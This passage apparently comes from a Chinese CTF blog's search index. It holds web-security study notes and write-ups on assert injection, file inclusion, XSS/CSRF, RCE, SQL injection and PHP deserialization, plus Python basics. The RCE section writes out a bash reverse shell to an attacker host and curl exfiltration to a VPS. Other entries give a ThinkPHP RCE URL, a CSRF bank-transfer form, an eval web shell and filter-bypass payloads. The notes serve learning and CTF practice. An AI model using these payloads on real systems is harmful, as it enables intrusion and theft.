| 匹配前面的子表达式一次或多次                         |\n| .    | 匹配除换行符 \\n 之外的任何单字符                     |\n| *    | 匹配前面的子表达式零次或多次                         |\n| ?    | 匹配前面的子表达式零次或一次，或指明一个非贪婪限定符 |\n|      |                                                      |\n\n所以让b字符串开头字符为上述任一字符就行\n\npayload：\n\n```\n?id=a&b=*12345&a=php://input\nbody:\nbugku is a nice plateform!\n```\n\n拿到flag\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/NGV.png)\n","tags":["CTF","web"]},{"title":"逻辑漏洞","url":"/posts/45471.html","content":"\n# 逻辑漏洞\n\n1、密码找回，任意用户注册\n\n注册时抓包请求头内容，并且在得到返回链接时对比内容，找出编解码方式\n\n<!--more-->\n\n2、支付漏洞\n\n抓包修改付款金额\n\n3、越权\n\n通过直接更改URL中的请求值直接查看或更改他人数据\n\n4、\n","tags":["CTF","web"]},{"title":"攻防世界mfw","url":"/posts/10100.html","content":"\n# 攻防世界mfw\n\n进入网页查看about内容，发现网页使用git进行版本管理\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/mfw1.png)\n\n网站后加.git发现存在git泄漏![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/mfw2.png)\n\n<!--more-->\n\n使用GitHack脚本获得源码\n\n```php\n<?php\n\nif (isset($_GET['page'])) {\n\t$page = $_GET['page'];\n} else {\n\t$page = \"home\";\n}\n\n$file = \"templates/\" . $page . \".php\";\n\n// I heard '..' is dangerous!\nassert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\");\n\n// TODO: Make this look nice\nassert(\"file_exists('$file')\") or die(\"That file doesn't exist!\");\n\n?>\n<!DOCTYPE html>\n<html>\n\t<head>\n\t\t<meta charset=\"utf-8\">\n\t\t<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n\t\t<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n\t\t\n\t\t<title>My PHP Website</title>\n\t\t\n\t\t<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css\" />\n\t</head>\n\t<body>\n\t\t<nav class=\"navbar navbar-inverse navbar-fixed-top\">\n\t\t\t<div class=\"container\">\n\t\t    \t<div class=\"navbar-header\">\n\t\t    \t\t<button type=\"button\" class=\"navbar-toggle collapsed\" data-toggle=\"collapse\" data-target=\"#navbar\" aria-expanded=\"false\" aria-controls=\"navbar\">\n\t\t            \t<span class=\"sr-only\">Toggle navigation</span>\n\t\t            \t<span class=\"icon-bar\"></span>\n\t\t            \t<span class=\"icon-bar\"></span>\n\t\t            \t<span class=\"icon-bar\"></span>\n\t\t          \t</button>\n\t\t          \t<a class=\"navbar-brand\" href=\"#\">Project name</a>\n\t\t        </div>\n\t\t        <div id=\"navbar\" class=\"collapse navbar-collapse\">\n\t\t          \t<ul class=\"nav navbar-nav\">\n\t\t            \t<li <?php if ($page == \"home\") { ?>class=\"active\"<?php } ?>><a href=\"?page=home\">Home</a></li>\n\t\t            \t<li <?php if ($page == \"about\") { ?>class=\"active\"<?php } ?>><a href=\"?page=about\">About</a></li>\n\t\t            \t<li <?php if ($page == \"contact\") { ?>class=\"active\"<?php } ?>><a href=\"?page=contact\">Contact</a></li>\n\t\t\t\t\t\t<!--<li <?php if ($page == \"flag\") { ?>class=\"active\"<?php } ?>><a href=\"?page=flag\">My secrets</a></li> -->\n\t\t          \t</ul>\n\t\t        </div>\n\t\t    </div>\n\t\t</nav>\n\t\t\n\t\t<div class=\"container\" style=\"margin-top: 50px\">\n\t\t\t<?php\n\t\t\t\trequire_once $file;\n\t\t\t?>\n\t\t\t\n\t\t</div>\n\t\t\n\t\t<script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js\" />\n\t\t<script src=\"https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js\" />\n\t</body>\n</html>\n\n```\n\nassert()函数将内容当作php命令执行，strpos()函数查找字符串1中字符串2首次出现的位置，尝试通过闭合构造命令\n\n```php\nassert(\"strpos('$file', '..') === false\")\n```\n\n首先使用')闭合strpos函数而后输入.命令拼接字符串，最后加入//注释后面内容\n\n完整payload：\n\n```\n?page=').phpinfo();//\n```\n\n传入后原函数变为\n\n```php\nassert(\"strpos('').phpinfo();//', '..') === false\")\n```\n\n执行成功\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/mfw3.png)\n\n随后通过system()函数得到flag\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/mfw4.png)\n","tags":["CTF","web"]},{"title":"文件包含","url":"/posts/59563.html","content":"\n# 文件包含\n\n常见的文件包含漏洞函数：include()，require()\n\n### 本地包含\n\n#### 利用方式：\n\n###### 1、php://input：\n\n```\n?file=php://input\n请求体内为PHP代码：<?php phpinfo(); ?>\n```\n\nphp://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input，同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。\n\n遇到file_get_contents()要想到用php://input绕过。\n\n<!--more-->\n\n###### 2、php://filter：\n\n```\n?file=php://filter/rescource=xxx.php\n以base64编码读取\n?file=php://filter/read=convert.base64-encode/resource=xxx.php\n```\n\nphp://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。\n\n###### 3、zip://：\n\n```\n?file=zip://[压缩包绝对路径]#[压缩包内文件]\n```\n\nzip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。\n\n- zip://中只能传入绝对路径。\n- 要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23\n- 只需要是zip的压缩包即可，后缀名可以任意更改。\n- 相同的类型的还有zlib://和bzip2://\n\n###### 4、data://：\n\n```\n?file=data://[<MIME-type>][;cherset=<encoding>][;base64],<data>\n下面为示例\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTsgPz4=\n```\n\ndata:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。\n\n###### 5、phar//：\n\n```\n?file=phar://压缩包路径（相对绝对都可）/压缩包内文件\n```\n\n需要phar://有点类似zip://同样可以导致任意代码执行。\n\n#### 可供包含的内容：\n\n###### 1、包含Apache日志文件：\n\n###### **条件：对日志文件可读并且知道日志文件的存储目录**\n\n**注意事项：**一般情况下日志存储目录被修改，需要读取服务器配置文件（httpd，conf，nginx，conf...）或者根据phpinfo()中的信息来得知。还有就是日志记录的信息都可以被调整，比如记录报错的等级或者内容格式。\n\nApache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。\n\n如果访问一个不存在的资源时，如http://www.xxxx.com/<?php phpinfo(); ?>,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把<?php phpinfo(); ?> 写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全起见，安装apache时尽量不要使用默认路径。\n\n可以放在User-Agent中\n\n###### 2、包含SESSION\n\n**条件：**找到Session内的可控变量，并且Session文件可读写，并且知道存储路径，PHP中SESSION文件保存路径可以在phpinfo中看到\n\n**常见路径：**\n\n/var/lib/php/sess_PHPSESSID\n/var/lib/php/sess_PHPSESSID\n/tmp/sess_PHPSESSID\n/tmp/sessions/sess_PHPSESSID\nsession文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。\n\n\n###### 3、包含/pros/self/environ\n\n**内容：**proc/self/environ中会保存user-agent头，如果在user-agent中插入php代码，则php代码会被写入到environ中，之后再包含它，即可。\n\n**条件：**php以cgi方式运行，这样environ才会保持UA头。environ文件存储位置已知，且environ文件可读。\n\n###### 4、包含临时文件\n\nphp中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\\Winsdows\\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。\n\n由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。\n\n另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。\n","tags":["CTF","web"]},{"title":"XSS","url":"/posts/7933.html","content":"\n# XSS\n\n#### 内容：\n\n全称为跨站脚本攻击，是一种Web应用程序的漏洞，来自用户的不可信数据在没有验证的情况下被应用程序进行了处理，没有正确转义（escape）或编码（encode）反射回浏览器，导致浏览器引擎执行了非预期代码\n\n#### 类型：\n\n###### 反射性：直接传输代码后，经过后端渲染代码直接放入了前端页面中\n\n###### 存储型：将代码经过后端处理存入数据库，当从数据库查询经前端渲染后代码被执行\n\n###### DOM型：不需要以来服务端相应内容，如果HTML页面中使用了document.location等DOM元素的属性，攻击者就可以利用这些属性注入恶意脚本实施基于DOM的跨站脚本攻击\n\n<!--more-->\n\n#### DOM：\n\nDocument Object Model（文档对象模型），通过HTLM DOM，树中所有节点都可通过JavaScript进行访问，修改，创建，删除\n\n![DOM示意](/images/DOM示意.png)\n\nXSS盲打：\n\n构架script标签使受害者执行，通过document.location和document.cookie获取到受害者的cookie及管理页面等隐私内容导致网站内容泄漏\n\n```html\n<sCRiPt sRC=></sCrIpT>\n```\n\n\n\n#### CSRF：\n\n跨站请求伪造\n\n攻击流程：通过获取受害的Cookie等信息，伪造对应用户的请求头，通过用户身份![CSRF](/images/CSRF.jpg)\n\n使用方法：制作网站时可通过构造img标签直接访问，如\n\n```html\n<img src=\"http://www.myBank.com/Transfer.php?toBankId=1111&money=1000\">\n```\n\n或者通过JavaScript构造post请求并通过dom元素直接提交，如\n\n```html\n<html>\n　　<head>\n　　　　<script type=\"text/javascript\">\n　　　　　　function steal()\n　　　　　　{\n          　　　　 iframe = document.frames[\"steal\"];\n　　     　　      iframe.document.Submit(\"transfer\");\n　　　　　　}\n　　　　</script>\n　　</head>\n\n　　<body onload=\"steal()\">//页面完全载入后触发\n　　　　<iframe name=\"steal\" display=\"none\">\n　　　　　　<form method=\"POST\" name=\"transfer\"　action=\"http://www.myBank.com/Transfer.php\">\n　　　　　　　　<input type=\"hidden\" name=\"toBankId\" value=\"11\">\n　　　　　　　　<input type=\"hidden\" name=\"money\" value=\"1000\">\n　　　　　　</form>\n　　　　</iframe>\n　　</body>\n</html>\n```\n\n或者完全伪造原表单，并且填写好内容，通过javascript直接提交\n\n```html\n<body>\n    <form method=\"post\" action=\"money.php\" id=\"mon\">\n        用户名：<input type=\"text\" name=\"user\" id=\"user\" value=\"Jlan\">\n        转账人：<input type=\"money\" name=\"money\" id=\"pass\" value=\"100000\">\n    </form>\n    <script>\n        document.getElementById(\"mon\").submit()\n    </script>\n</body>\n```\n\n#### SSRF：\n\n服务端请求伪造\n\n攻击流程：通过页面中可访问其他页面的位置通过服务端发起请求进而获取到客户端无法访问的内部系统\n\n攻击位置：有在线翻译，页面收藏，图片加载下载等\n","tags":["CTF","web"]},{"title":"Python面向对象","url":"/posts/18439.html","content":"\n# Python面向对象\n\n#### 类的定义：\n\n```python\n#object是所有类的基类\n#每个对象会保存自己的属性，不同对象间属性没有必然联系\n#类内部可通过self操作\nclass 类名(object):\n  def 函数名(self):\n    方法内容\n\t\n```\n\n<!--more-->\n\n#### 类外操作对象属性：\n\n```python\n对象名.属性名=属性内容#给类添加或修改属性\n```\n\n#### 魔法方法：\n\n这类方法以双下划线开头和结尾，在满足某种特定条件是会调用这种方法\n\n```python\n#创建对象后会立即调用\n#使用时类似构造函数\n__init__(self,参数1,参数2)\n```\n\n```python\n#该方法返回值为字符串，在使用print(对象)时会自动调用\n#进行强制类型转换时也会自动调用\n__str__(self)\n```\n\n```python\n#对象在内存中被销毁时会调用\n#使用时类似析构函数，可使用del 变量名进行销毁\n__del__(self)\n```\n\n","tags":["Note","Python"]},{"title":"Python基础","url":"/posts/14702.html","content":"\n# Python基础\n\n#### 数据类型：\n\nstring（字符串）\n\nnum（数字）\n\nbool（布尔）\n\nlist（列表）使用[    ]定义\n\ntuple（元组）使用{     }定义（无序）\n\ndictionary（字典）使用{     }定义，内容为：下标名:元素内容\n\n<!--more-->\n\n#### 字符串相关函数：\n\n###### 查找：\n\n```python\nstr.find(str1,start,end)//rfind从末尾开始查找\nstr.index(str1,start,end)//rindex从末尾开始查找\n```\n\n在字符串中查找是否存在str1，存在返回第一次出现的位置，不存在find返回-1，index报错\n\n```python\nstr.count(str1,start,end)\n```\n\n查找字符串中某字符串出现的次数\n\n###### 替换：\n\n```python\nstr.replace(old,new,count)\n```\n\n将字符串中old内容替换为new，count为最大替换次数，返回新字符串，不改变原来字符串\n\n###### 切割：\n\n```python\nstr.split(str1,count)\n```\n\n将字符串以str1为分隔切割，count为最大切割次数，返回一个列表，不改变原有字符串，默认按空白字符进行全切割\n\n###### 加入：\n\n```python\nstr.join(可迭代对象)\n```\n\n将str插入到可迭代对象两个元素之间，返回一个字符串\n\n###### 乱七八糟：\n\n```python\ncapitalize(str)//将字符串中第一个字母大写\ntitle(str)//字符串中每个单词首字母大写\nstr.startwith(str1)//检查字符串是否以str1开头\nstr.endwith(str1)//检查字符串是否以str1结尾\nstr.upper()//字母全大写\nstr.lower()//字母全小写\n```\n\n\n\n\n\ninput输入\n\nprint输出\n\nread读文件（按字节读），readline（按行读）\n\nopen(\"文件名\"，\"打开方式（r只读，w写入，a追加，（b）代表以二进制打开，（+）代表读写）\"，encoding=\"编码方式\")打开文件（以二进制进行读写时不能指定encoding方式）\n\n*args不定长参数，接收后生成元组\n\n**kwargs不定长参数，接收后生成字典\n\n#### Python内存管理机制：引用计数\n\n```python\na=1 #a地址引用为1\nb=a #a地址引用为2\ndel a #a地址引用为1\ndel b #a地址引用为0，此时a引用地址被销毁\n```\n\n","tags":["Python"]},{"title":"CTFshow 爆破web25","url":"/posts/14198.html","content":"\n# CTFshow 爆破web25\n\n首先查看代码\n\n```php\n<?php\nerror_reporting(0);\ninclude(\"flag.php\");\nif(isset($_GET['r'])){\n    $r = $_GET['r'];\n    mt_srand(hexdec(substr(md5($flag), 0,8)));\n    $rand = intval($r)-intval(mt_rand());\n    if((!$rand)){\n        if($_COOKIE['token']==(mt_rand()+mt_rand())){\n            echo $flag;\n        }\n    }else{\n        echo $rand;\n    }\n}else{\n    highlight_file(__FILE__);\n    echo system('cat /proc/version');\n}\n?>\n```\n\n<!--more-->\n\n发现传入值有r，cookie需要进行伪造，先随便传入一个r，发现多次刷新后显示的值相同，说明随机数生成的结果相同，都是949254252\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/web251.png)\n\n查询后得知\n\n```\nmt_srand()//以传入变量作为种子分发\nmt_rand()//以种子生成随机数\n```\n\n由于每次的seed相同，所以生成的随机数相同，尝试构造payload\n\n```\n?r=949254252 Cookie: token=1898508504\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/web252.png)\n\n结果发现失败，查看提示，发现是在多次掉用mt_rand()时生成的随机数与种子有关但并不相等，所以不能简单用token=2*mt_rand()解决，使用提示中给出的脚本计算出seed，放入PHP环境中实验\n","tags":["CTF","web"]},{"title":"模版漏洞","url":"/posts/29600.html","content":"\n# 模版漏洞\n\n### ThinkPHP V5漏洞：\n\n```url\n?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=PHP函数名&vars[1][]=PHP函数参数1&vars[1][]=PHP函数参数2\n```\n\n该漏洞可用于执行PHP函数\n\n<!--more-->\n","tags":["CTF","web","Note"]},{"title":"RCE远程代码执行","url":"/posts/47881.html","content":"\n# **RCE远程代码执行**\n\n#### **一、RCE能做到什么：**\n\n1、执行系统命令 2、记录用户输入 3、控制键盘鼠标 4、任意上传下载 5、截屏\n\n<!--more-->\n\n#### **二、RCE产生原因：**\n\n1、服务器上有木马 \n\n2、脆弱服务未授权\n\n3、通过数据库写木马 \n\n4、文件上传/文件包含 \n\n5、危险函数（eval，assert，system，shell_exec，exec，file_put_contents） \n\n6、命令执行 \n\n7、反序列化\n\n#### **三、RCE远程代码执行关键点：**\n\n##### **1、RCE黑名单过滤：**\n\nlinux执行命令特殊字符：（;分割命令）（&&在前一个命令执行成功的前提下执行后面命令）（||前一个命令执行失败的前提下执行后面命令）（|将前面命令执行的结果作为输入，输入到后面命令中执行）（``将命令执行结果作为命令再次执行）（$()和前一个一样）\n\n过滤空格后可使用<向命令传入参数，${IFS}为空格，%0a为分号转译\n\n`cat绕过可使用tac more less head tac tail nl od(二进制查看) vi vim sort uniq`\n\n`绕过空格用%09 <> ${IFS} $IFS$9 {cat,fl*} %20`\n\n`flag绕过可使用通配符f*`\n\n##### **2、RCE无回显：**\n\n（1）、反弹shell：攻击端监听一个端口如：2333 \n\n​\t攻击端使用：\n\n```shell\nnc -lvp 监听的端口\n```\n\n​\t受害端使用如下命令生成一个反弹shell：\n\n```shell\nbash -i >& /dev/tcp/攻击端IP/攻击端监听端口 0>&1\n```\n\n​\t在攻击端终端即可在受害端中执行命令\n\n（2）、dnslog：通过ping $(命令).域名 通过这种方式获取命令执行结果\n\n（3）、写文件：将命令执行结果写入到文件中，使用echo命令：\n\n```shell\necho \"写入内容\">test.txt\n```\n\n（4）、curl等网络命令：通过POST等方式直接给到个人私有VPS中\n\n```shell\ncurl -d \"key1=value1&key2=value2&key3=value3\" protocol://ip:port/path\n```\n\n##### **3、RCE后发现不出网**\n\n（1）、写文件\n\n（2）、命令盲注：命令||sleep 100\n\n（3）、隐蔽信道\n\n##### 4、字符绕过\n\n（1）、\n\n```\n使用''或\"\"隔断字符串\n```\n\n（2）、空格可使用：<，<>，${IFS}，$IFS，%20(space)，%09(tab)，$IFS$9，$IFS$1 替换\n\n（3）、分号可使用：%0a，%0d，%0D，%0A 替换\n\n（4）、使用base64编码：Y2F0IGZsYWcucGhw|base64，将其中内容解码后执行\n\n（5）、使用`反引号包裹命令，将其中内容作为前一命令的输入\n\n##### 5、可用于执行系统命令的函数\n\nexec()、passthru()、system()、shell_exec()\n","tags":["web","Note","RCE"]},{"title":"SQL注入笔记","url":"/posts/26213.html","content":"\n# **SQL注入**\n\n1、通过order by爆出字段数\n\n2、union操作，联合查询，查询的是在同一个数据表的数据，通过union select 1,2,3…,n来判断回显位置\n\n3、information_schema数据库，为mysql自带数据库，提供数据库源数据访问，最常用的是\n\n**TABLES表**：提供了关于数据库中表的信息\n\n**COLUMNS表**：提供了表中列的信息\n\n<!--more-->\n\n爆破库名：\n\n```mysql\nunion select 1,2,database()\n//靠错误爆出库名\nand exists(select * from aaa)\n//aaa表并不存在，此时会报错停止并返回数据库名.aaa\n```\n\n爆破表名：\n\n```mysql\nunion select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()\nand exists(select * from 表名)//爆破出表名\n```\n\n爆破列名：\n\n```mysql\nunion select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"想查询的表名\"\nand exists(select 列名 from 已知表名)//爆破出列名\n```\n\n4、报错注入\n\n（1）updatexml：更新XML文档的函数\n\n语法：**updatexml（文档类型，xpath路径，更新的内容）**\n\n例子：\n\n```mysql\nand updatexml(0x0a,concat(0x0a,(select database())),’1’)\n```\n\n0x0a代表换行符，concat拼接\n\n拼接目的为使得查询结果能完全显示出来\n\n（2）extractvalue：对XML文档进行查询的函数\n\n语法：**extractvalue（文档类型，xpath路径）**\n\n报错原理：路径中写入不合法的格式，就会报错并且返回我们写入的非法格式内容，我们可以利用这个得到我们想得到的内容\n\n```mysql\nand (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema= 'sqli'))))\n```\n\n提示：报错最长显示30个字符内容，如果内容过长可使用substr函数进行拆分\n\n​\t例题：CTFHub技能树web-SQL注入-报错注入\n\n​\t![SQLError](/images/quiz/SQLError.png)\n\n​\t首先爆破库表列名\n\n​\t![SQLError2](/images/quiz/SQLError2.png)\n\n​\t进而发现flag过长用substr切割\n\n​\t![SQLError3](/images/quiz/SQLError3.png)\n\n​\t得到flag\n\n5、盲注：\n\n布尔盲注：回显只有两种情况，一种有一种无\n\nif表达式：if(expr1,expr2,expr3)\n\nexpr1为真就返回expr2（可用于执行函数）\n\nsubstr函数：substr(字符串,起始位置,截取长度)\n\nascii函数：将函数内字符以ascii表转换为数字，而后可以进行判断\n\n\n\n时间盲注：无回显，可以通过sleep函数判断是否为时间盲注\n\n~~建议直接sqlmap~~\n\n（1）、sleep函数看延迟时间\n\n（2）、benchmark(执行次数,方式)，执行超多次看延迟时间\n\n6、堆叠注入：通过语句分割符号（  ;  ）分隔多条语句，直接将想要的数据插入到表中，然后再通过查询语句读取\n\n7、mysql文件读写：读取：load_file函数：load_file(‘文件路径’)\n\n写入：\n\n```mysql\nselect ‘<?php eval($_POST[cmd]);?>’ into outfile或dumpfile '绝对路径';//建议用dumpfile，因为outfile会在文件末行写入新行，使用的转译换行符，会破坏文件完整性，可能导致一句话木马无法执行\n```\n\n8、关键词绕过：通过\n\n（1）、set@a：设定一个语句变量 set@sql=0x16进制数\n\n（2）、prepare : 存储一个sql语句 存到execsql 里面 prepare execsql from @sql\n\n（3）、execute :执行一个sql语句 execute execsql\n\n由于设定语句变量时，mysql会自动将16进制数据转换为文字\n\n9、零碎\n\n```mysql\nto_base64(内容)//该语句将内容经过base64编码后输出\nreplace(ori,old,new)\n```\n\n```\n%0a,/**/可代替空格\n```\n\n```\n--+，%23，#将后面的语句注释\n```\n\n10、SQL约束攻击\n\n在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。例如如下代码：\n\n```sql\nSELECT userId from user where username = 'test            '//看这里有很多空格\n```\n\n上述代码和username = 'test'结果是一样的。但也存在异常情况，最好的例子就是LIKE子句了。注意，对尾部空白符的这种修剪操作，主要是在“**字符串比较**”期间进行的。这是因为，**SQL会在内部使用空格来填充字符串**，**以便在比较之前使其它们的长度保持一致**。\n\n在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅插入字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“testName”时，实际上只能插入字符串的前5个字符，即“testN”。\n\n```php\n//注册示例代码\n<?php\n$username = mysql_real_escape_string($_GET['username']);\n$password = mysql_real_escape_string($_GET['password']);\n$query = \"SELECT *\n          FROM users\n          WHERE username='$username'\";\n$res = mysql_query($query, $database);\nif($res) {\n  if(mysql_num_rows($res) > 0) {\n  }\n  else {\n    $query = \"INSERT INTO users(username, password)\n?>\n```\n\n这里注册时使用用户名+【大量空格】和随机密码注册即可完成攻击。\n\n主要原理就是insert时候有varchar(n)的限制，大于n的时候会截取前n个存入。在数据库对字符串进行比较时，即select操作，如果两个字符串的长度不一样，则会将较短的字符串末尾填充空格，使两个字符串的长度一致。注册时select语句不会将\"admin+[大量空格]11\"删减到n位，所以不会被select查出与admin重复，不会返回数据，接下来就可以插入admin+[空格]（截取）11和自定义密码了。\n\n如果使用用户名“vampire”和密码“random_pass”登录的话，对比时是admin与admin+[大量空格]，会将前面的admin添加空格与后面的长度相同在进行对比，那么返回的只能是我们自己注册的用户信息，而不会返回目标用户信息。SQL查询语句是一个and操作，如果密码不一样怎么会把目标用户的信息也返回回来?\n\n当登陆时使用admin与自定义密码登陆，数据库将返回我们自己注册的账户信息，但是注意此处的return $username，虽然此时查询出来的是我们自己的用户信息，但是返回的用户名则是目标的用户名。如果此后的业务逻辑直接以该用户名为准，则我们就达到了水平越权的目的。\n\n\n\n\n\n**HANDLER语句查询**\n\n出自该题[GYCTF2020]Blacklist，类似于某道堆叠注入的进阶版，但是该题过滤太多了，之前那道题的payload完全不可用了\n\n```\nreturn preg_match(\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\",$inject);\n```\n\n知识点：handler语句查询\n\n```mysql\n\nHANDLER tbl_name OPEN [ [AS] alias]\n \nHANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)\n    [ WHERE where_condition ] [LIMIT ... ]\nHANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }\n    [ WHERE where_condition ] [LIMIT ... ]\nHANDLER tbl_name READ { FIRST | NEXT }\n    [ WHERE where_condition ] [LIMIT ... ]\n \nHANDLER tbl_name CLOSE\n\n```\n\n构造出语句如下\n\n```\npayload:\n1';use supersqli;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#\n```\n","tags":["web","Note","SQL"]},{"title":"CTF零碎笔记","url":"/posts/11612.html","content":"\n# 零碎笔记\n\nmt_srand( )该函数在PHP4.2.0之前传入任意参数后生成的都是伪随机数，在任何机器上只要运行的同样的seed参数结果都相同\n\n<!--more-->\n\nKindEditor编辑器漏洞，在使用该编辑器是在url末尾加上/php/file_manager_json.php?path=路径，就会便利路径中所有内容，特征为前端代码中有对php/file_manager_json.php的引用\n\n###### md5弱相等绕过：\n\n1、构造数组a[]=xxxx&b[]=xxxx\n\n2、弱相等时转换为相同数据类型，0e开头的字符串会被转为0，字符串如下\n\n```\nQNKCDZO//0e830400451993494058024219903391\ns878926199a//0e545993274517709034328855841020\ns155964671a//0e342768416822451524974117254469\ns214587387a//0e848240448830537924465865611904\ns214587387a//0e848240448830537924465865611904\ns878926199a//0e545993274517709034328855841020\ns1091221200a//0e940624217856561557816327384675\n```\n\n\n\n## 序列化与反序列化：\n\n#### 序列化：\n\n将一个对象转化为一个有序的字符串\n\n#### 序列化格式：\n\n结构类型:\n\n```php\n对象名长度:\"对象名\":类中项目数量:{项目1类型:项目1长度:”项目1内容”;项目2类型:项目2长度:”项目2内容”;} \n```\n\n例子：\n\n```php\nO:4:\"xctf\":2:{s:4:\"flag\";s:3:\"111\";}\n//O代表对象类型，s代表字符串类型\n```\n\n#### 序列化有关函数：\n\n```php\nserialize(对象)//将对象进行序列化，返回一个字符串\n```\n\n```php\nunserialize(字符串)//将对应字符串进行反序列化操作，返回一个类\n```\n\n```php\n__wakeup()//该函数为类内函数，如果序列化中对象属性个数的值大于真是个数时就会跳过该函数执行\t\n```\n\n```PHP\n__construct\n// 触发条件，构造函数，当构造一个对象时调用。\n// 对象创建时销毁\n__destruct\n// 触发条件，析构函数，对象销毁时被调用。\n// 序列化时会销毁一次，对象销毁时执行，序列化输出前运行，但不影响序列化内容\n__unserialize\n// 触发条件，7.4版本以上，反序列化时出发，且可以绕过__wakeup\n__sleep()\n// 在对象被序列化之前运行\n__wakeup()\n// 在对象被反序列化之后被调用\n__invoke\n// 当对象被调用时执行\n// 函数形式调用对象时，触发的方法\n```\n\n","tags":["web","Note"]},{"title":"CTF","url":"/posts/58958.html","content":"\nJlan的CTF之旅从现在开始了\n\n","tags":["Note"]}]